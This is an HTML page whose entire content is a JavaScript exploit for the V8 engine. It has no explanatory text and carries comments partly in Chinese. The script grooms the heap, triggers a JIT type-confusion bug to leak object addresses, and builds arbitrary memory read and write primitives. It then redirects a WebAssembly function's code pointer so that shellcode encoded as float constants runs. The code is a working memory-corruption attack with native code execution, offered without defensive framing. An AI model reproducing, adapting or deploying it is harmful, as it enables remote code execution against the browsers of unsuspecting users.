<script>
    var dv = new DataView(new ArrayBuffer(0x10));
    function gc() {
        for (var i = 0; i < 0x100; i++) new Array(0x200);
    }
    const to_hex = num => {
        return (num >> 0n).toString(16);
    }
    function biglow(b) {
        dv.setBigUint64(0, b, true);
        return (dv.getUint32(0, true));
    }
    function bighi(b) {
        dv.setBigUint64(0, b, true);
        return (dv.getUint32(4, true));
    }
    function f2big(f) {
        dv.setFloat64(0, f, true);
        return (dv.getBigUint64(0, true));
    }
    function big2f(b) {
        dv.setBigUint64(0, b, true);
        return dv.getFloat64(0, true);
    }
    function flow(f) {
        dv.setFloat64(0, f, true);
        return (dv.getUint32(0, true));
    }
    function fhi(f) {
        dv.setFloat64(0, f, true);
        return (dv.getUint32(4, true));
    }
    function i2f(low, hi) {
        dv.setUint32(0, low, true);
        dv.setUint32(4, hi, true);
        return dv.getFloat64(0, true);
    }
    function majorGc() {
        var arr_stack = [];
        for (let i = 0; i < 80; i++) {
            try {
                arr_stack.push(new ArrayBuffer(0x7ff00000000 + i));
            } catch (msg) {
                break;
            }
        }
    }
    class LeakArrayBuffer extends ArrayBuffer {
        constructor(size) {
            super(size);
            this.rw = [1.7, 1.7];// 0x3ffb333333333333
            this.slot = 0xb33f;//搜索0x1667E，查看改变位置，为leakObj地方
        }
    }
    let shellcode = [2.222372952568011e+127,
        3.4476922241098093e+40,
        -2.5784757691472832e-254,
        -1.476674265851898e-90,
        2.582607795529539e-293,
        2.4887534188622283e+253,
        9.353354960368843e-158,
        1.772861363575525e-297,
        2.941218276584707e+26,
        1.7578789445410664e-302,
        -1.3535215646275278e-183,
        1.19831254e-314];
    var arr = null;
    var buff = null;
    for (let i = 0; i < 0x1000; i++) {
        arr = new Array(1.1, 1.1);
        buff = new LeakArrayBuffer(0x1337);
    }
    majorGc(); gc(); majorGc(); gc(); majorGc(); gc(); majorGc(); gc();
    {
        function leak() {
            function setInnerProperty(o, obj) {
                for (let m = 0; m < 0x100000; m++) {
                    o.inner.foo = obj;
                }
            }
            function foo(str, addr) {
                var o = {
                    inner: {
                        ['foo']: 1.5
                    }
                };
                eval(str);// eval防止内联
                // o.inner.foo = addr;
                return o.inner.foo;
                // return arr;
            };
            % PrepareFunctionForOptimization(foo);
            // optimize setInnerProperty
            foo("setInnerProperty(o, arr);", 1.4);
            majorGc();
            foo("setInnerProperty(o, arr);", 1.4);
            majorGc();
            % OptimizeFunctionOnNextCall(foo);
            let o = foo("setInnerProperty(o, arr);", 1.4);
            // console.log(f2big(o).toString(16));
            return (f2big(o).toString(16));
        }
        let addr = leak();
        fetch(addr, {
            method: 'GET',
            mode: 'no-cors' // 在开发环境中允许不安全连接
        })
            .then(response => {
                % DebugPrint("fuckhere");
                % DebugPrint(arr);
            })  // 你也可以使用 response.json() 如果你知道响应会是 JSON 格式的
            .then(data => {
                new Promise((resolve, reject) => {
                    setTimeout(() => {
                        resolve();
                    }, 2000);
                }).then(() => {
                    if (arr.length !== 2) {
                        alert("length is changed!!check how to exp");
                        console.log("length is changed!!check how to exp");
                        function leakObj(o) {
                            buff.slot = o;
                            return fhi(arr[10]);
                        }
                        function write(addr_low, val) {
                            arr[15] = i2f((addr_low | 1) - 0x8, fhi(arr[15]));
                            buff.rw[0] = val;
                        }
                        function read(addr_low) {
                            arr[15] = i2f((addr_low | 1) - 0x8, fhi(arr[15]));
                            return buff.rw[0];
                        }

                        // randPE_addr = read(function_slot);
                        // alert(f2big(randPE_addr).toString(16).padStart(16, 0));
                        arr_addr = leakObj(shellcode);
                        raw_shellcode_addr = ((flow(read(arr_addr + 0x8))) | 1) - 1 + 0x8;
                        % DebugPrint(shellcode);
                        alert("raw_shellcode_addr:" + raw_shellcode_addr.toString(16).padStart(8, 0));
                        fetch(raw_shellcode_addr.toString(16).padStart(8, 0)+".wasm")
                            .then((response) => response.arrayBuffer())
                            .then((wasmBinary) => WebAssembly.compile(wasmBinary))
                            .then((wasmModule) => WebAssembly.instantiate(wasmModule))
                            .then((wasmInstance) => {
                                const { f } = wasmInstance.exports;
                                % DebugPrint("wasmInstance addr is:");
                                % DebugPrint(wasmInstance);
                                wasmInstance_addr = leakObj(wasmInstance);
                                alert("wasmInstance_addr:"+wasmInstance_addr.toString(16).padStart(8,0));
                                rx_mem_addr = f2big(read(wasmInstance_addr + 0x60));
                                alert("rx_mem_addr:"+rx_mem_addr.toString(16).padStart(16,0));
                                rop_start=rx_mem_addr+0x65dn;
                                // 泄露function地址，修改 backingStore
                                % DebugPrint("main func addr is:");
                                % DebugPrint(f);
                                faddr = leakObj(f);
                                alert("f addr:" + faddr.toString(16).padStart(8, 0));
                                function_slot = flow(read(faddr + 0x18)) + 0x10;
                                alert("function_slot and go to mem to check addr:" + function_slot.toString(16).padStart(8, 0));
                                write(function_slot,big2f(rop_start));
                                alert("check memory");
                                f();
                            });
                    }
                });
            })
            .catch(error => {
                // 在这里处理任何上面的.then()中发生的错误
                console.error('Error:', error);
            });
    }
</script>